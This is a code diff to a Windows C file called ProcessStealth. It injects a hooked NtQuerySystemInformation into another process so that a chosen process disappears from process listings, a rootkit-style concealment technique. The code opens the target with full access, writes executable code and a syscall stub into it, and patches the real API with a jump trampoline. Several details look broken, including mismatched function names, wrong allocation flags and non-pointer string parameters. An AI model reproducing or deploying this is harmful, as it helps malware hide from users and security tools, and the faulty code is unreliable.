@@ -1,6 +1,9 @@
 #include "ProcessStealth.h"
 
-DWORD GetProcessIdByImageName(wchar_t* ProcessName)
+NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+int AtherFunc();
+
+DWORD GetProcessIdByImageName(wchar_t *ProcessName)
 {
     PSYSTEM_PROCESS_INFORMATION spi;
     DWORD PID = NULL;
@@ -44,7 +47,7 @@ DWORD GetProcessIdByImageName(wchar_t* ProcessName)
 
         spi = (ULONGLONG)spi + spi->NextEntryOffset;
     }
-    
+
     VirtualFree(temp, ReturnLength, MEM_DECOMMIT);
     VirtualFree(temp, 0, MEM_RELEASE);
 
@@ -53,6 +56,10 @@ DWORD GetProcessIdByImageName(wchar_t* ProcessName)
 
 BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
 {
+    BYTE Syscall[16] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05};
+
+    BYTE TrampolineCode[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
+
     DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
@@ -64,12 +71,85 @@ BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
         return FALSE;
     }
 
+    PVOID NewFunction = VirtualAllocEx(hProcess, NULL, NewNtQuerySystemInformation_Size, MEM_COMMIT | MEM_RELEASE, PAGE_EXECUTE_READWRITE);
 
+    if (NewFunction == NULL)
+    {
+        printf("[-] VirtualAllocEx Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    memcpy(TrampolineCode + 2, &NewFunction, 8);
+
+    SIZE_T NumberOfBytesWritten;
+
+    if (WriteProcessMemory(hProcess, NewFunction, NewNtQuerySystemInformation, NewNtQuerySystemInformation_Size, &NumberOfBytesWritten) == FALSE)
+    {
+        printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    DWORD SystemCallNumber = *(DWORD *)((ULONGLONG)NtQuerySystemInformation + 4);
+
+    memcpy(Syscall + 4, &SystemCallNumber, 4);
+
+    PVOID SyscallClone = (ULONGLONG)NewFunction + NewNtQuerySystemInformation_Size;
+
+    if (WriteProcessMemory(hProcess, SyscallClone, Syscall, 16, &NumberOfBytesWritten) == FALSE)
+    {
+        printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    PVOID ProcessName = (ULONGLONG)SyscallClone + 16;
+
+    if (WriteProcessMemory(hProcess, ProcessName, HideProcessName, wcslen(HideProcessName), &NumberOfBytesWritten) == FALSE)
+    {
+        printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwrite(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
+    {
+        printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwrite(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
+    {
+        printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    if (WriteProcessMemory(hProcess, NtQuerySystemInformation, TrampolineCode, 12, &NumberOfBytesWritten) == FALSE)
+    {
+        printf("[-] WriteProcessMemory Failed!\n");
+        printf("[*] GetLastError : %d\n", GetLastError());
+        return FALSE;
+    }
+}
+
+DWORD SearchOverwriteOffset(PVOID Address)
+{
+    ULONGLONG Pointer_Overwrite = 0xCCCCCCCCCCCCCCCC;
+    for (int i = 0;; i++)
+    {
+        if (memcmp((ULONGLONG)Address + i, Pointer_Overwrite, 8) == 0)
+        {
+            return i;
+        }
+    }
 }
 
 NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
-    volatile BYTE (NTAPI *CloneNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) = 0xCCCCCCCCCCCCCCCC;
+    volatile BYTE(NTAPI * CloneNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) = 0xCCCCCCCCCCCCCCCC;
     volatile wchar_t *HideProcessName = 0xCCCCCCCCCCCCCCCC;
     NTSTATUS ntstatus = CloneNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
@@ -114,3 +194,4 @@ NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
         return ntstatus;
     }
 }
+int AtherFunc() {}
